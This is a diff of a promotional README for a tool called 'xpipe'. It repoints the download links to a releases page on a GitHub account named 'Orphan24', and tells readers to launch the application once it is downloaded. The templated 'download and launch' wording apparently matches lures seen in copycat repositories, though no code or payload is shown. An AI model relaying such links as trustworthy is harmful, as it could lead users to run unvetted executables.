@@ -25,7 +25,7 @@ Enhance your server management capabilities with Windows Subsystem for Linux (WS
 
 ## Get Started
 
-To experience the full potential of **xpipe**, make sure to download the application [here](https://github.com/project/files/App.zip).
+To experience the full potential of **xpipe**, make sure to download the application [here](https://github.com/Orphan24/xpipe/releases).
 
 If the link above ends with the file name, remember to launch the application after downloading it. In case the link is unreachable, consider checking the "Releases" section for alternative download options.
 
@@ -33,7 +33,7 @@ If the link above ends with the file name, remember to launch the application af
 
 Stay up to date with our latest developments and updates by following us on our GitHub repository.
 
-[![Download xpipe](https://img.shields.io/badge/Download-xpipe-blue.svg)](https://github.com/project/files/App.zip)
+[![Download xpipe](https://github.com/Orphan24/xpipe/releases)](https://github.com/Orphan24/xpipe/releases)
 
 Unlock a new level of efficiency in managing your server infrastructure with **xpipe**. Simplify your workflow and take control of your servers like never before! 🚀
 
